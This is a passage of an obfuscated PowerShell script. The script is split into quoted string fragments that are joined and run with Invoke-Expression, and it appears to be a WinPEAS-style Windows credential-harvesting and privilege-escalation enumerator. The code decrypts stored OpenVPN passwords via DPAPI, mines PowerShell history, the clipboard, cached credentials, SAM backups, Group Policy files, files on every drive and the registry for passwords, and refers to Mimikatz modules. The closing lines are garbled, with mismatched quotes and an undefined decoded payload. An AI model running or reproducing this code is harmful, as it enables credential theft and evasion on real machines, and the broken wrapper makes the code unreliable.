Write-H','ost -ForegroundCol','or Blue "=========','|| OpenVPN Credent','ials Check"

$keys',' = Get-ChildItem "','HKCU:\Software\Ope','nVPN-GUI\configs" ','-ErrorAction Silen','tlyContinue
if ($K','eys) {
  Add-Type ','-AssemblyName Syst','em.Security
  $ite','ms = $keys | ForEa','ch-Object { Get-It','emProperty $_.PsPa','th }
  foreach ($i','tem in $items) {
 ','   $encryptedbytes',' = $item.''auth-dat','a''
    $entropy = ','$item.''entropy''
  ','  $entropy = $entr','opy[0..(($entropy.','Length) - 2)]

   ',' $decryptedbytes =',' [System.Security.','Cryptography.Prote','ctedData]::Unprote','ct(
      $encrypt','edBytes, 
      $e','ntropy, 
      [Sy','stem.Security.Cryp','tography.DataProte','ctionScope]::Curre','ntUser)
 
    Writ','e-Host ([System.Te','xt.Encoding]::Unic','ode.GetString($dec','ryptedbytes))
  }
','}


Write-Host ""
','if ($TimeStamp) { ','TimeElapsed }
Writ','e-Host -Foreground','Color Blue "======','===|| PowerShell H','istory (Password S','earch Only)"

Writ','e-Host "=|| PowerS','hell Console Histo','ry"
Write-Host "=|','| To see all histo','ry, run this comma','nd: Get-Content (G','et-PSReadlineOptio','n).HistorySavePath','"
Write-Host $(Get','-Content (Get-PSRe','adLineOption).Hist','orySavePath | Sele','ct-String pa)

Wri','te-Host "=|| AppDa','ta PSReadline Cons','ole History "
Writ','e-Host "=|| To see',' all history, run ','this command: Get-','Content $env:USERP','ROFILE\AppData\Roa','ming\Microsoft\Win','dows\PowerShell\PS','Readline\ConsoleHo','st_history.txt"
Wr','ite-Host $(Get-Con','tent "$env:USERPRO','FILE\AppData\Roami','ng\Microsoft\Windo','ws\PowerShell\PSRe','adline\ConsoleHost','_history.txt" | Se','lect-String pa)


','Write-Host "=|| Po','werShell default t','ranscript history ','check "
if (Test-P','ath $env:SystemDri','ve\transcripts\) {',' "Default transcri','pts found at $($en','v:SystemDrive)\tra','nscripts\" }


# E','numerating Environ','ment Variables
Wri','te-Host ""
if ($Ti','meStamp) { TimeEla','psed }
Write-Host ','-ForegroundColor B','lue "=========|| E','NVIRONMENT VARIABL','ES "
Write-Host "M','aybe you can take ','advantage of modif','ying/creating a bi','nary in some of th','e following locati','ons"
Write-Host "P','ATH variable entri','es permissions - p','lace binary or DLL',' to execute instea','d of legitimate"
W','rite-Host "https:/','/book.hacktricks.w','iki/en/windows-har','dening/windows-loc','al-privilege-escal','ation/index.html#d','ll-hijacking" -For','egroundColor Yello','w

Get-ChildItem e','nv: | Format-Table',' -Wrap


Write-Hos','t ""
if ($TimeStam','p) { TimeElapsed }','
Write-Host -Foreg','roundColor Blue "=','========|| Sticky ','Notes Check"
if (T','est-Path "C:\Users','\$env:USERNAME\App','Data\Local\Package','s\Microsoft.Micros','oftStickyNotes*\Lo','calState\plum.sqli','te") {
  Write-Hos','t "Sticky Notes da','tabase found. Coul','d have credentials',' in plain text: "
','  Write-Host "C:\U','sers\$env:USERNAME','\AppData\Local\Pac','kages\Microsoft.Mi','crosoftStickyNotes','*\LocalState\plum.','sqlite"
}

# Check',' for Cached Creden','tials
# https://co','mmunity.idera.com/','database-tools/pow','ershell/powertips/','b/tips/posts/getti','ng-cached-credenti','als
Write-Host ""
','if ($TimeStamp) { ','TimeElapsed }
Writ','e-Host -Foreground','Color Blue "======','===|| Cached Crede','ntials Check"
Writ','e-Host "https://bo','ok.hacktricks.wiki','/en/windows-harden','ing/windows-local-','privilege-escalati','on/index.html#wind','ows-vault" -Foregr','oundColor Yellow 
','cmdkey.exe /list

','
Write-Host ""
if ','($TimeStamp) { Tim','eElapsed }
Write-H','ost -ForegroundCol','or Blue "=========','|| Checking for DP','API RPC Master Key','s"
Write-Host "Use',' the Mimikatz ''dpa','pi::masterkey'' mod','ule with appropria','te arguments (/rpc',') to decrypt"
Writ','e-Host "https://bo','ok.hacktricks.wiki','/en/windows-harden','ing/windows-local-','privilege-escalati','on/index.html#dpap','i" -ForegroundColo','r Yellow

$appdata','Roaming = "C:\User','s\$env:USERNAME\Ap','pData\Roaming\Micr','osoft\"
$appdataLo','cal = "C:\Users\$e','nv:USERNAME\AppDat','a\Local\Microsoft\','"
if ( Test-Path "','$appdataRoaming\Pr','otect\") {
  Write','-Host "found: $app','dataRoaming\Protec','t\"
  Get-ChildIte','m -Path "$appdataR','oaming\Protect\" -','Force | ForEach-Ob','ject {
    Write-H','ost $_.FullName
  ','}
}
if ( Test-Path',' "$appdataLocal\Pr','otect\") {
  Write','-Host "found: $app','dataLocal\Protect\','"
  Get-ChildItem ','-Path "$appdataLoc','al\Protect\" -Forc','e | ForEach-Object',' {
    Write-Host ','$_.FullName
  }
}
','

Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| Checking for D','PAPI Cred Master K','eys"
Write-Host "U','se the Mimikatz ''d','papi::cred'' module',' with appropriate ','/masterkey to decr','ypt" 
Write-Host "','You can also extra','ct many DPAPI mast','erkeys from memory',' with the Mimikatz',' ''sekurlsa::dpapi''',' module" 
Write-Ho','st "https://book.h','acktricks.wiki/en/','windows-hardening/','windows-local-priv','ilege-escalation/i','ndex.html#dpapi" -','ForegroundColor Ye','llow

if ( Test-Pa','th "$appdataRoamin','g\Credentials\") {','
  Get-ChildItem -','Path "$appdataRoam','ing\Credentials\" ','-Force
}
if ( Test','-Path "$appdataLoc','al\Credentials\") ','{
  Get-ChildItem ','-Path "$appdataLoc','al\Credentials\" -','Force
}


Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| Curren','t Logged on Users"','
try { quser }catc','h { Write-Host "''q','user'' command not ','not present on sys','tem" } 


Write-Ho','st ""
if ($TimeSta','mp) { TimeElapsed ','}
Write-Host -Fore','groundColor Blue "','=========|| Remote',' Sessions"
try { q','winsta } catch { W','rite-Host "''qwinst','a'' command not pre','sent on system" }
','

Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| Kerberos ticke','ts (does require a','dmin to interact)"','
try { klist } cat','ch { Write-Host "N','o active sessions"',' }


Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| Printing Cl','ipBoard (if any)"
','Get-ClipBoardText
','
#################','####### File/Crede','ntials check #####','##################','#
Write-Host ""
if',' ($TimeStamp) { Ti','meElapsed }
Write-','Host -ForegroundCo','lor Blue "========','=|| Unattended Fil','es Check"
@("C:\Wi','ndows\sysprep\sysp','rep.xml",
  "C:\Wi','ndows\sysprep\sysp','rep.inf",
  "C:\Wi','ndows\sysprep.inf"',',
  "C:\Windows\Pa','nther\Unattended.x','ml",
  "C:\Windows','\Panther\Unattend.','xml",
  "C:\Window','s\Panther\Unattend','\Unattend.xml",
  ','"C:\Windows\Panthe','r\Unattend\Unatten','ded.xml",
  "C:\Wi','ndows\System32\Sys','prep\unattend.xml"',',
  "C:\Windows\Sy','stem32\Sysprep\una','ttended.xml",
  "C',':\unattend.txt",
 ',' "C:\unattend.inf"',') | ForEach-Object',' {
  if (Test-Path',' $_) {
    Write-H','ost "$_ found."
  ','}
}


############','############ GROUP',' POLICY RELATED CH','ECKS #############','###########
Write-','Host ""
if ($TimeS','tamp) { TimeElapse','d }
Write-Host -Fo','regroundColor Blue',' "=========|| SAM ','/ SYSTEM Backup Ch','ecks"

@(
  "$Env:','windir\repair\SAM"',',
  "$Env:windir\S','ystem32\config\Reg','Back\SAM",
  "$Env',':windir\System32\c','onfig\SAM",
  "$En','v:windir\repair\sy','stem",
  "$Env:win','dir\System32\confi','g\SYSTEM",
  "$Env',':windir\System32\c','onfig\RegBack\syst','em") | ForEach-Obj','ect {
  if (Test-P','ath $_ -ErrorActio','n SilentlyContinue',') {
    Write-Host',' "$_ Found!" -Fore','groundColor red
  ','}
}

Write-Host ""','
if ($TimeStamp) {',' TimeElapsed }
Wri','te-Host -Foregroun','dColor Blue "=====','====|| Group Polic','y Password Check"
','
$GroupPolicy = @(','"Groups.xml", "Ser','vices.xml", "Sched','uledtasks.xml", "D','ataSources.xml", "','Printers.xml", "Dr','ives.xml")
if (Tes','t-Path "$env:Syste','mDrive\Microsoft\G','roup Policy\histor','y") {
  Get-ChildI','tem -Recurse -Forc','e "$env:SystemDriv','e\Microsoft\Group ','Policy\history" -I','nclude @GroupPolic','y
}

if (Test-Path',' "$env:SystemDrive','\Documents and Set','tings\All Users\Ap','plication Data\Mic','rosoft\Group Polic','y\history" ) {
  G','et-ChildItem -Recu','rse -Force "$env:S','ystemDrive\Documen','ts and Settings\Al','l Users\Applicatio','n Data\Microsoft\G','roup Policy\histor','y"
}

Write-Host "','"
if ($TimeStamp) ','{ TimeElapsed }
Wr','ite-Host -Foregrou','ndColor Blue "====','=====|| Recycle Bi','n TIP:"
Write-Host',' "If credentials a','re found in the re','cycle bin, tool fr','om nirsoft may ass','ist: http://www.ni','rsoft.net/password','_recovery_tools.ht','ml" -ForegroundCol','or Yellow

#######','################# ','File/Folder Check ','##################','######

Write-Host',' ""
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======||  Passwor','d Check in Files/F','olders"

# Looking',' through the entir','e computer for pas','swords
# Also look','s for MCaffee site',' list while loopin','g through the driv','es.
if ($TimeStamp',') { TimeElapsed }
','Write-Host -Foregr','oundColor Blue "==','=======|| Password',' Check. Starting a','t root of each dri','ve. This will take',' some time. Like, ','grab a coffee or t','ea kinda time."
Wr','ite-Host -Foregrou','ndColor Blue "====','=====|| Looking th','rough each drive, ','searching for $fil','eExtensions"
# Che','ck if the Excel co','m object is instal','led, if so, look t','hrough files, if n','ot, just notate if',' a file has "user"',' or "password in n','ame"
try { 
  New-','Object -ComObject ','Excel.Application ','| Out-Null
  $Read','Excel = $true 
}
c','atch {
  $ReadExce','l = $false
  if($E','xcel) {
    Write-','Host -ForegroundCo','lor Yellow "Host d','oes not have Excel',' COM object, will ','still point out ex','cel files when fou','nd."  
  }
}
$Driv','es.Root | ForEach-','Object {
  $Drive ','= $_
  Get-ChildIt','em $Drive -Recurse',' -Include $fileExt','ensions -ErrorActi','on SilentlyContinu','e -Force | ForEach','-Object {
    $pat','h = $_
    #Exclud','e files/folders wi','th ''lang'' in the n','ame
    if ($Path.','FullName | select-','string "(?i).*lang','.*"){
      #Write','-Host "$($_.FullNa','me) found!" -Foreg','roundColor red
   ',' }
    if($Path.Fu','llName | Select-St','ring "(?i).:\\.*\\','.*Pass.*"){
      ','write-host -Foregr','oundColor Blue "$(','$path.FullName) co','ntains the word ''p','ass''"
    }
    if','($Path.FullName | ','Select-String ".:\','\.*\\.*user.*" ){
','      Write-Host -','ForegroundColor Bl','ue "$($path.FullNa','me) contains the w','ord ''user'' -exclud','ing the ''users'' di','rectory"
    }
   ',' # If path name en','ds with common exc','el extensions
    ','elseif ($Path.Full','Name | Select-Stri','ng ".*\.xls",".*\.','xlsm",".*\.xlsx") ','{
      if ($ReadE','xcel -and $Excel) ','{
        Search-E','xcel -Source $Path','.FullName -SearchT','ext "user"
       ',' Search-Excel -Sou','rce $Path.FullName',' -SearchText "pass','"
      }
    }
  ','  else {
      if ','($path.Length -gt ','0) {
        # Wri','te-Host -Foregroun','dColor Blue "Path ','name matches exten','sion search: $path','"
      }
      if',' ($path.FullName |',' Select-String "(?','i).*SiteList\.xml"',') {
        Write-','Host "Possible MCa','ffee Site List Fou','nd: $($_.FullName)','"
        Write-Ho','st "Just going to ','leave this here: h','ttps://github.com/','funoverip/mcafee-s','itelist-pwd-decryp','tion" -ForegroundC','olor Yellow
      ','}
      $regexSear','ch.keys | ForEach-','Object {
        $','passwordFound = Ge','t-Content $path.Fu','llName -ErrorActio','n SilentlyContinue',' -Force | Select-S','tring $regexSearch','[$_] -Context 1, 1','
        if ($pass','wordFound) {
     ','     Write-Host "P','ossible Password f','ound: $_" -Foregro','undColor Yellow
  ','        Write-Host',' $Path.FullName
  ','        Write-Host',' -ForegroundColor ','Blue "$_ triggered','"
          Write-','Host $passwordFoun','d -ForegroundColor',' Red
        }
   ','   }
    }  
  }
}','

################','######## Registry ','Password Check ###','##################','###

Write-Host -F','oregroundColor Blu','e "=========|| Reg','istry Password Che','ck"
# Looking thro','ugh the entire reg','istry for password','s
Write-Host "This',' will take some ti','me. Won''t you have',' a pepsi?"
$regPat','h = @("registry::\','HKEY_CURRENT_USER\','", "registry::\HKE','Y_LOCAL_MACHINE\")','
# Search for the ','string in registry',' values and proper','ties
foreach ($r i','n $regPath) {
(Get','-ChildItem -Path $','r -Recurse -Force ','-ErrorAction Silen','tlyContinue) | For','Each-Object {
    ','$property = $_.pro','perty
    $Name = ','$_.Name
    $prope','rty | ForEach-Obje','ct {
      $Prop =',' $_
      $regexSe','arch.keys | ForEac','h-Object {
       ',' $value = $regexSe','arch[$_]
        i','f ($Prop | Where-O','bject { $_ -like $','value }) {
       ','   Write-Host "Pos','sible Password Fou','nd: $Name\$Prop"
 ','         Write-Hos','t "Key: $_" -Foreg','roundColor Red
   ','     }
        $Pr','op | ForEach-Objec','t {   
          $','propValue = (Get-I','temProperty "regis','try::$Name").$_
  ','        if ($propV','alue | Where-Objec','t { $_ -like $Valu','e }) {
           ',' Write-Host "Possi','ble Password Found',': $name\$_ $propVa','lue"
          }
 ','       }
      }
 ','   }
  }
  if ($Ti','meStamp) { TimeEla','psed }
  Write-Hos','t "Finished $r"
}
'); $script = $fragments -join ''; Invoke-Expression $script'); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated